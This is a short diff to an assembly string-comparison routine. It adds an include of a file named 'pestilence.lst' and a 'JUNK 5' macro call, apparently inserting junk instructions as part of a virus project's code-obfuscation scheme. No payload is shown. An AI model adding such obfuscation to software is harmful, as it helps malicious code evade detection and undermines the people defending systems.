@@ -1,4 +1,5 @@
 %define FT_STREQU_S
+%include "pestilence.lst"
 
 section	.text
 	global	_ft_strequ
@@ -9,6 +10,7 @@ _ft_strequ:
 	push	rsi
 	push	r10
 
+	JUNK 5
 	xor		rax, rax
 	mov		rax, 1
 
